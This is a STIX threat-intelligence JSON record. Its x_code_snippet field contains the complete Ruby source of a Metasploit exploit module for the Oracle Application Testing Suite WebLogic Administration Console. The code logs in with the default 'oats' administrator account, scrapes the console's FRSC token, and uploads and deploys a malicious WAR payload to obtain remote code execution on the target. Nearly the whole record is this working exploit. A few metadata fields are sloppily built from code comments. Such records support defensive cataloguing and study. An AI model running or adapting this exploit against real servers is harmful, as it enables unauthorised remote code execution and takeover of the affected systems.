{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--134839dd-aab3-4271-840e-31cf86f7431e",
    "created": "2024-08-14T16:52:01.087025Z",
    "modified": "2024-08-14T16:52:01.08703Z",
    "name": "Oracle Application Testing Suite WebLogic Server Administration Console War Deployment",
    "description": " This module abuses a feature in WebLogic Server's Administration Console to install a malicious Java application in order to gain remote code execution. Authentication is required, however by default, Oracle ships with a \"oats\" account that you could log in with, which grants you administrator access.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/oats_weblogic_console.rb",
            "external_id": "oats_weblogic_console.rb"
        },
        {
            "source_name": "#TheCVEdescriptionmatcheswhatthisexploitisdoing",
            "external_id": "butitwasforversion"
        },
        {
            "source_name": "#CVE",
            "external_id": "2007-2699"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'Oracle Application Testing Suite WebLogic Server Administration Console War Deployment',\n      'Description'    => %q{\n        This module abuses a feature in WebLogic Server's Administration Console to install\n        a malicious Java application in order to gain remote code execution. Authentication\n        is required, however by default, Oracle ships with a \"oats\" account that you could\n        log in with, which grants you administrator access.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Steven Seeley', # Used the trick and told me about it\n          'sinn3r'         # Metasploit module\n        ],\n      'Platform'       => 'java',\n      'Arch'           => ARCH_JAVA,\n      'Targets'        =>\n        [\n          [ 'WebLogic Server Administration Console 12 or prior', { } ]\n        ],\n      'References'     =>\n        [\n          # The CVE description matches what this exploit is doing, but it was for version\n          # 9.0 and 9.1. We are not super sure whether this is the right CVE or not.\n          # ['CVE', '2007-2699']\n        ],\n      'DefaultOptions' =>\n        {\n          'RPORT' => 8088\n        },\n      'Notes'          =>\n        {\n          'SideEffects' => [ IOC_IN_LOGS ],\n          'Reliability' => [ REPEATABLE_SESSION ],\n          'Stability'   => [ CRASH_SAFE ]\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2019-03-13',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The route for the Rails application', '/']),\n        OptString.new('OATSUSERNAME', [true, 'The username for the admin console', 'oats']),\n        OptString.new('OATSPASSWORD', [true, 'The password for the admin console'])\n      ])\n\n    register_advanced_options(\n      [\n        OptString.new('DefaultOatsPath', [true, 'The default path for OracleATS', 'C:\\\\OracleATS'])\n      ])\n  end\n\n  class LoginSpec\n    attr_accessor :admin_console_session\n  end\n\n  def login_spec\n    @login_spec ||= LoginSpec.new\n  end\n\n  class OatsWarPayload < MetasploitModule\n    attr_reader :name\n    attr_reader :war\n\n    def initialize(payload)\n      @name = [Faker::App.name, Rex::Text.rand_name].sample\n      @war = payload.encoded_war(app_name: name).to_s\n    end\n  end\n\n  def default_oats_path\n    datastore['DefaultOatsPath']\n  end\n\n  def war_payload\n    @war_payload ||= OatsWarPayload.new(payload)\n  end\n\n  def set_frsc\n    value = get_deploy_frsc\n    @frsc = value\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, 'console', 'login', 'LoginForm.jsp')\n    })\n\n    if res && res.body.include?('Oracle WebLogic Server Administration Console')\n      return Exploit::CheckCode::Detected\n    end\n\n    Exploit::CheckCode::Safe\n  end\n\n  def set_admin_console_session(res)\n    cookie = res.get_cookies\n    admin_console_session = cookie.scan(/ADMINCONSOLESESSION=(.+);/).flatten.first\n    vprint_status(\"Token for console session is: #{admin_console_session}\")\n    login_spec.admin_console_session = admin_console_session\n  end\n\n  def is_logged_in?(res)\n    html = res.get_html_document\n    a_element = html.at('a')\n    if a_element.respond_to?(:attributes) && a_element.attributes['href']\n      link = a_element.attributes['href'].value\n      return URI(link).request_uri == '/console'\n    end\n\n    false\n  end\n\n  def do_login\n    uri = normalize_uri(target_uri.path, 'console', 'login', 'LoginForm.jsp')\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => uri\n    })\n\n    fail_with(Failure::Unknown, 'No response from server') unless res\n    set_admin_console_session(res)\n\n    uri = normalize_uri(target_uri.path, 'console', 'j_security_check')\n    res = send_request_cgi({\n      'method' => 'POST',\n      'uri'    => uri,\n      'cookie' => \"ADMINCONSOLESESSION=#{login_spec.admin_console_session}\",\n      'vars_post' =>\n        {\n          'j_username'           => datastore['OATSUSERNAME'],\n          'j_password'           => datastore['OATSPASSWORD'],\n          'j_character_encoding' => 'UTF-8'\n        }\n    })\n\n    fail_with(Failure::Unknown, 'No response while trying to log in') unless res\n    fail_with(Failure::NoAccess, 'Failed to login') unless is_logged_in?(res)\n    store_valid_credential(user: datastore['OATSUSERNAME'], private: datastore['OATSPASSWORD'])\n    set_admin_console_session(res)\n  end\n\n  def get_deploy_frsc\n    # First we are just going through the pages in a specific order to get the FRSC value\n    # we need to prepare uploading the WAR file.\n    res = nil\n    requests =\n      [\n        { path: 'console/', vars: {} },\n        { path: 'console/console.portal', vars: {'_nfpb'=>\"true\"} },\n        { path: 'console/console.portal', vars: {'_nfpb'=>\"true\", '_pageLabel' => 'HomePage1'} }\n      ]\n\n    requests.each do |req|\n      res = send_request_cgi({\n        'method'   => 'GET',\n        'uri'      => normalize_uri(target_uri.path, req[:path]),\n        'cookie'   => \"ADMINCONSOLESESSION=#{login_spec.admin_console_session}\",\n        'vars_get' => req[:vars]\n      })\n\n      fail_with(Failure::Unknown, 'No response while retrieving FRSC') unless res\n    end\n\n    html = res.get_html_document\n    hidden_input = html.at('input[@name=\"ChangeManagerPortletfrsc\"]')\n    frsc_attr = hidden_input.respond_to?(:attributes) ? hidden_input.attributes['value'] : nil\n    frsc_attr ? frsc_attr.value : ''\n  end\n\n  def do_select_upload_action\n    action = '/com/bea/console/actions/app/install/selectUploadApp'\n    app_path = Rex::FileUtils.normalize_win_path(default_oats_path, 'oats\\\\servers\\\\AdminServer\\\\upload')\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'console', 'console.portal'),\n      'cookie'    => \"ADMINCONSOLESESSION=#{login_spec.admin_console_session}\",\n      'vars_get'  =>\n        {\n          'AppApplicationInstallPortlet_actionOverride' => action\n        },\n      'vars_post' =>\n        {\n          'AppApplicationInstallPortletselectedAppPath' => app_path,\n          'AppApplicationInstallPortletfrsc' => frsc\n        }\n    })\n\n    fail_with(Failure::Unknown, \"No response from #{action}\") unless res\n  end\n\n  def do_upload_app_action\n    action = '/com/bea/console/actions/app/install/uploadApp'\n    ctype = 'application/octet-stream'\n    app_cname = 'AppApplicationInstallPortletuploadAppPath'\n    plan_cname = 'AppApplicationInstallPortletuploadPlanPath'\n    frsc_cname = 'AppApplicationInstallPortletfrsc'\n    war = war_payload.war\n    war_name = war_payload.name\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(war, ctype, 'binary', \"form-data; name=\\\"#{app_cname}\\\"; filename=\\\"#{war_name}.war\\\"\")\n    post_data.add_part('', ctype, nil, \"form-data; name=\\\"#{plan_cname}\\\"; filename=\\\"\\\"\")\n    post_data.add_part(frsc, nil, nil, \"form-data; name=\\\"#{frsc_cname}\\\"\")\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),\n      'cookie'   => \"ADMINCONSOLESESSION=#{login_spec.admin_console_session}\",\n      'vars_get' =>\n        {\n          'AppApplicationInstallPortlet_actionOverride' => action\n        },\n       'ctype'   => \"multipart/form-data; boundary=#{post_data.bound}\",\n       'data'    => post_data.to_s\n    })\n\n    fail_with(Failure::Unknown, \"No response from #{action}\") unless res\n    print_response_message(res)\n  end\n\n  def do_app_select_action\n    action = '/com/bea/console/actions/app/install/appSelected'\n    war_name = war_payload.name\n    app_path = Rex::FileUtils.normalize_win_path(default_oats_path, \"oats\\\\servers\\\\AdminServer\\\\upload\\\\#{war_name}.war\")\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),\n      'cookie'   => \"ADMINCONSOLESESSION=#{login_spec.admin_console_session}\",\n      'vars_get' =>\n        {\n          'AppApplicationInstallPortlet_actionOverride' => action\n        },\n      'vars_post' =>\n        {\n          'AppApplicationInstallPortletselectedAppPath' => app_path,\n          'AppApplicationInstallPortletfrsc'            => frsc\n        }\n    })\n\n    fail_with(Failure::Unknown, \"No response from #{action}\") unless res\n    print_response_message(res)\n  end\n\n  def do_style_select_action\n    action = '/com/bea/console/actions/app/install/targetStyleSelected'\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),\n      'cookie'   => \"ADMINCONSOLESESSION=#{login_spec.admin_console_session}\",\n      'vars_get' =>\n        {\n          'AppApplicationInstallPortlet_actionOverride' => action\n        },\n      'vars_post' =>\n        {\n          'AppApplicationInstallPortlettargetStyle' => 'Application',\n          'AppApplicationInstallPortletfrsc'        => frsc\n        }\n    })\n\n    fail_with(Failure::Unknown, \"No response from #{action}\") unless res\n  end\n\n  def do_finish_action\n    action = '/com/bea/console/actions/app/install/finish'\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),\n      'cookie'   => \"ADMINCONSOLESESSION=#{login_spec.admin_console_session}\",\n      'vars_get' =>\n        {\n          'AppApplicationInstallPortlet_actionOverride' => action\n        },\n      'vars_post' =>\n        {\n          'AppApplicationInstallPortletname'             => war_payload.name,\n          'AppApplicationInstallPortletsecurityModel'    => 'DDOnly',\n          'AppApplicationInstallPortletstagingStyle'     => 'Default',\n          'AppApplicationInstallPortletplanStagingStyle' => 'Default',\n          'AppApplicationInstallPortletfrsc'             => frsc\n        }\n    })\n\n    fail_with(Failure::Unknown, \"No response from #{action}\") unless res\n    print_response_message(res)\n\n    # 302 is a good enough indicator of a successful upload, otherwise\n    # the server would actually return a 200 with an error message.\n    res.code == 302\n  end\n\n  def print_response_message(res)\n    html = res.get_html_document\n    message_div = html.at('div[@class=\"message\"]')\n    if message_div\n      msg = message_div.at('span').text\n      print_status(\"Server replies: #{msg.inspect}\")\n    end\n  end\n\n  def deploy_war\n    set_frsc\n    print_status(\"FRSC value: #{frsc}\")\n    do_select_upload_action\n    do_upload_app_action\n    do_app_select_action\n    do_style_select_action\n    do_finish_action\n  end\n\n  def goto_war(name)\n    print_good(\"Operation \\\"#{name}\\\" is a go!\")\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => normalize_uri(target_uri.path, name)\n    })\n\n    print_status(\"Code #{res.code} on \\\"#{name}\\\" request\") if res\n  end\n\n  def undeploy_war\n    war_name = war_payload.name\n    handle = 'com.bea.console.handles.JMXHandle(\"com.bea:Name=oats,Type=Domain\")'\n    contents = %Q|com.bea.console.handles.AppDeploymentHandle(\"com.bea:Name=#{war_name},Type=AppDeployment\")|\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, 'console', 'console.portal'),\n      'cookie'   => \"ADMINCONSOLESESSION=#{login_spec.admin_console_session}\",\n      'vars_get' =>\n        {\n          'AppApplicationUninstallPortletreturnTo' => 'AppDeploymentsControlPage',\n          'AppDeploymentsControlPortlethandle' => handle\n        },\n      'vars_post' =>\n        {\n          # For some reason, the value given to the server is escapped twice.\n          # The Metasploit API should do it at least once.\n          'AppApplicationUninstallPortletchosenContents' => CGI.escape(contents),\n          '_pageLabel' => 'AppApplicationUninstallPage',\n          '_nfpb'      => 'true',\n          'AppApplicationUninstallPortletfrsc' => frsc\n        }\n    })\n\n    if res && res.code == 302\n      print_good(\"Successfully undeployed #{war_name}.war\")\n    else\n      print_warning(\"Unable to successfully undeploy #{war_name}.war\")\n      print_warning('You may want to do so manually.')\n    end\n  end\n\n  def cleanup\n    undeploy_war if is_cleanup_ready\n    super\n  end\n\n  def setup\n    @is_cleanup_ready = false\n    super\n  end\n\n  def exploit\n    unless check == Exploit::CheckCode::Detected\n      print_status('Target does not have the login page we are looking for.')\n      return\n    end\n\n    do_login\n    print_good(\"Logged in as #{datastore['OATSUSERNAME']}:#{datastore['OATSPASSWORD']}\")\n    print_status(\"Ready for war. Codename \\\"#{war_payload.name}\\\" at #{war_payload.war.length} bytes\")\n    result = deploy_war\n    if result\n      @is_cleanup_ready = true\n      goto_war(war_payload.name)\n    end\n  end\n\n  attr_reader :frsc\n  attr_reader :is_cleanup_ready\nend\n",
    "x_mitre_disclosure_date": "2019-03-13",
    "x_mitre_platforms": [
        "java'"
    ]
}